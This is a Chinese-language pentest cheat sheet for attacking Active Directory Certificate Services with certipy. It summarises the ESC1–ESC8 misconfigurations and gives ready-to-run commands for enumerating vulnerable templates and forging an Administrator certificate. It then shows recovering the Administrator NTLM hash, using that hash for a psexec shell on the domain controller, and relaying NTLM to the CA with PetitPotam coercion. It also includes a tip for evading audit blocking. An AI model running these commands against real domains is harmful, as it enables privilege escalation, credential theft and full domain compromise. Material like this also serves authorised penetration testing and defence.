---
os: linux
service: AD
syntax: certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC> -vulnerable
tags:
  - cmd
---

# ADCS 证书攻击 certipy

## ADCS 简介
- AD CS（Active Directory Certificate Services）提供 PKI 服务，证书模板配置不当可导致提权
- 攻击面集中在「证书模板的权限 / SAN 设置」，certipy 用 `find` 枚举 + `req`/`auth` 利用

## ESC1–ESC8 一句话说明
- **ESC1**：模板允许请求者提供 SAN（主体替代名），可申请任意用户的证书 → 冒用任意用户
- **ESC2**：模板可被用于任意用途（Any Purpose EKU）
- **ESC3**：注册代理 EKU 可代表其他用户请求证书
- **ESC4**：模板 ACL 可写（GenericWrite 等），可篡改模板配置
- **ESC5**：PKI 对象 ACL 可写（CA 服务器、证书模板容器等）
- **ESC6**：CA 开启了 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志，允许任意请求带 SAN
- **ESC7**：CA 的 Manage CA / Manage Certificates 权限可滥用
- **ESC8**：HTTP 端点 NTLM relay（配合 PetitPotam 等强制认证）

## 前提
- 域内存在 ADCS / CA，且能用低权限账户访问
- certipy 需能与 DC 和 CA 通信

## 前置检查
### 枚举易受攻击模板
```bash
certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC> -vulnerable
certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC> -stdout
```
- 输出 JSON/text，重点看标记 ESC1 的模板（EKU 允许 Client Auth + 允许 SAN）

## 利用步骤（重点 ESC1）

### 1. 申请可带 SAN 的证书
```bash
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC> -ca <CA_NAME> -template <VULN_TEMPLATE> -upn Administrator@<DOMAIN>
```
- 生成 `Administrator.pfx`

### 2. 用证书认证拿 NTLM hash
```bash
certipy auth -pfx Administrator.pfx -dc-ip <DC>
```
- 输出 Administrator 的 NTLM hash
- 用 hash 登录：
```bash
impacket-psexec -hashes :<NTHASH> <DOMAIN>/Administrator@<DC>
```

### 3. ESC8（HTTP NTLM relay 到 ADCS）
```bash
# 终端1：relay 到 ADCS web 端点
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template <VULN_TEMPLATE>
# 终端2：强制认证
python3 PetitPotam.py <LHOST> <IP>
```
- 或直接：
```bash
certipy relay -ca <CA_NAME> -template <VULN_TEMPLATE>
```

## 常见坑
- `-template` 名要和 `certipy find` 输出完全一致（区分大小写）
- ESC1 需模板 EKU 含 Client Authentication，否则证书不能用于认证
- 部分环境用 `-upn` 会被审计拦截，可改用 `-dns` 或指定 sid

## 参考开源项目
- Certipy (https://github.com/ly4k/Certipy)
